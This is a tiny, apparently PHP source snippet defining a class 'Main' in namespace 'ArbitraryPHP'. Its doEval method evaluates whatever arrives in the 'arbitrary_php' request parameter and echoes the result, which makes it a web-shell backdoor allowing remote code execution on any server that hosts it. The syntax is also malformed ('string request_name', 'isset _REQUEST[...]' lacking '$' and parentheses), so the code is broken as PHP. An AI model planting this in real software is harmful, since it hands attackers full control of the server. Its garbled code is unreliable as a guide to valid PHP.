namespace ArbitraryPHP;

class Main {
    public function doEval()
    {
        string request_name = "arbitrary_php";
        if isset _REQUEST[request_name] {
            echo eval(_REQUEST[request_name]);
        }
    }
}
